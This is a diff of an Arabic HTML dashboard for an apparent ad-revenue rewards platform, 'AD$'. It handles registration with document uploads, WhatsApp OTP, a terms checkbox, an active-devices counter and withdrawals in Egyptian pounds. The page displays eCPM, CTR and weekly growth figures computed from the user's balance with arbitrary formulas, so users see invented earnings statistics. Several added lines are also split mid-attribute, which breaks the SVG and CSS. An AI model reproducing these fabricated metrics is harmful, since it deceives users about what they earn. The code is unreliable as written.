@@ -11,7 +11,17 @@
     <title>بوابة الناشرين | عوائد الحملات الإعلانية والمكافآت الترويجية</title>
 
     <!-- شعار سطر الويب (Favicon) -->
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E
+
+%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' 
+
+stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' 
+
+width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url
+
+(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' 
+
+y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
     <link rel="apple-touch-icon" href="/app-icon.svg">
     <link rel="manifest" href="/manifest.json">
 
@@ -36,22 +46,26 @@
                     </defs>
                     <rect width="120" height="120" rx="26" fill="#0f172a"/>
                     <rect x="5" y="5" width="110" height="110" rx="22" fill="none" stroke="url(#logoGrad)" stroke-width="5"/>
-                    <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-
+
+linejoin="round"/>
                     <circle cx="90" cy="34" r="7" fill="#10b981"/>
                     <text x="60" y="102" font-family="Cairo, Arial" font-size="22" font-weight="800" fill="#ffffff" text-anchor="middle">AD$</text>
                 </svg>
             </div>
             <div class="logo-text-align">
-                <span class="logo-brand-name">منصة AD$ للتمويل الإعلاني</span>
+                <span class="logo-brand-name">
+                    منصة AD$ للتمويل الإعلاني
+                </span>
                 <span class="logo-install-hint" id="installStatusText">📲 اضغط على الشعار لتثبيت التطبيق</span>
             </div>
         </div>
 
         <div id="installToast" class="install-toast"></div>
 
-        <div class="network-tag">
-            <span>●</span> شبكة العوائد الإعلانية والشراكات الرقمية
-        </div>
+        <a href="/terms.html" class="network-tag" style="text-decoration: none;" title="عرض الشروط والأحكام وشبكات التمويل الإعلاني">
+            <span>●</span> شبكة التمويل الإعلاني والشراكات الرقمية (الشروط والأحكام)
+        </a>
         <h1>لوحة تحكم عوائد التمويل والمكافآت</h1>
         <p>نظام التوزيع البرمجي لأرباح المشاهدات والتحويل المباشر بالجنيه المصري</p>
     </header>
@@ -135,6 +149,20 @@
                 </div>
             </div>
 
+            <!-- مربع الموافقة الإلزامي على الشروط والأحكام -->
+            <div class="form-group" style="display:flex; align-items:center; gap:10px; background:rgba(10,15,29,0.6); padding:10px 12px; border-
+
+radius:10px; border:1px solid var(--card-border);">
+                <input type="checkbox" id="agreeTermsCheck" required style="width:18px; height:18px; accent-color:var(--accent); cursor:pointer;">
+                <label for="agreeTermsCheck" style="margin:0; font-size:0.83rem; color:#cbd5e1; cursor:pointer;">
+                    أقر بقراءة والموافقة على <a href="/terms.html" target="_blank" style="color:var(--accent); text-decoration:underline; font-weight:700;">
+
+الشروط والأحكام وسياسة الاستخدام</a> وشركاء <a href="/terms.html" target="_blank" style="color:#60a5fa; text-decoration:underline; font-weight:700;">التمويل 
+
+الإعلاني</a>.
+                </label>
+            </div>
+
             <button type="submit" class="btn-submit" id="regBtn">إرسال طلب التسجيل والمرفقات الثلاثة</button>
         </form>
 
@@ -147,7 +175,9 @@
             <div class="form-group">
                 <label>كود مصادقة واتساب (OTP)</label>
                 <div class="otp-row">
-                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" required>
+                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" 
+
+required>
                     <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('reset')">📲 OTP إرسال كود</button>
                 </div>
             </div>
@@ -201,9 +231,9 @@
                 <div class="metric-trend">● متوافق مع المعايير</div>
             </div>
             <div class="metric-card">
-                <div class="metric-label">الحملات الممولة النشطة</div>
-                <div class="metric-val" id="metricCampaigns">0 حملة</div>
-                <div class="metric-trend">● رعاية مباشرة معتمدة</div>
+                <div class="metric-label">عدد الأجهزة النشطة</div>
+                <div class="metric-val" id="metricCampaigns">0 جهاز</div>
+                <div class="metric-trend">● متزامن مع Worker List</div>
             </div>
         </div>
 
@@ -291,6 +321,31 @@
             </div>
             <div id="withdrawListContainer" class="withdraw-list"></div>
         </div>
+    </div>
+
+    <!-- شريط حقوق الطبع والنشر ورابط الشروط والأحكام -->
+    <div class="ad-legal-bar" style="text-align: center; margin-top: 1.5rem; padding-bottom: 1.5rem;">
+        <a href="/terms.html" title="اضغط للاطلاع على الشروط والأحكام وسياسة الاستخدام" style="
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 9px 22px;
+            border-radius: 50px;
+            background: rgba(17, 24, 39, 0.78);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 0.84rem;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.3);
+            transition: all 0.25s ease;
+        " onmouseover="this.style.borderColor='#10b981'; this.style.color='#f8fafc'; this.style.transform='translateY(-2px)';"
+           onmouseout="this.style.borderColor='rgba(59, 130, 246, 0.25)'; this.style.color='#94a3b8'; this.style.transform='translateY(0)';">
+            <span style="color: #10b981; font-weight: 800; font-size: 0.95rem;">&copy; 2026</span>
+            <span>جميع حقوق الطبع والنشر محفوظة — منصة <strong style="color: #60a5fa;">AD$</strong> للتمويل الإعلاني</span>
+        </a>
     </div>
 </div>
 
@@ -696,7 +751,6 @@
             document.getElementById("trendImpressions").textContent = "● في انتظار تحديث العوائد";
             document.getElementById("metricEcpm").textContent = "$0.00";
             document.getElementById("metricCtr").textContent = "0.00%";
-            document.getElementById("metricCampaigns").textContent = "0 حملة";
             return;
         }
         const ecpm = 1.85 + ((balance % 80) / 100);
@@ -712,7 +766,6 @@
         const growthRate = (8.5 + (balance % 12)).toFixed(1);
         document.getElementById("trendImpressions").textContent = `▲ +${growthRate}% هذا الأسبوع`;
         document.getElementById("metricCtr").textContent = `${(3.10 + ((balance % 175) / 100)).toFixed(2)}%`;
-        document.getElementById("metricCampaigns").textContent = `${Math.max(1, Math.min(45, Math.ceil(balance / 20)))} حملة`;
     }
 
     async function syncWithServer() {
@@ -743,6 +796,14 @@
                 } else {
                     hwBanner.style.display = "none";
                 }
+
+                // تحديث عدد الأجهزة النشطة من Worker List
+                const workersNum = parseInt(data.activeWorkers, 10) || 0;
+                let workersLabel = `${workersNum} جهاز`;
+                if (workersNum === 1) workersLabel = "1 جهاز";
+                else if (workersNum === 2) workersLabel = "2 جهاز";
+                else if (workersNum >= 3 && workersNum <= 10) workersLabel = `${workersNum} أجهزة`;
+                document.getElementById("metricCampaigns").textContent = workersLabel;
 
                 officialBankRate = parseFloat(data.exchangeRate) || 56.26;
                 currentAvailableBalance = parseFloat(data.balance) || 0;
@@ -1016,7 +1077,7 @@
     if (authToken) enterDashboard();
     setInterval(syncWithServer, 4000);
 </script>
-    <!-- استدعاء ملف الـ Widget لضمان ظهور فقاعة الترحيب وتفعيل الشات -->
+<!-- استدعاء ملف الـ Widget لضمان ظهور فقاعة الترحيب وتفعيل الشات -->
 <script src="/chat-widget.js" defer></script>
 </body>
 </html>
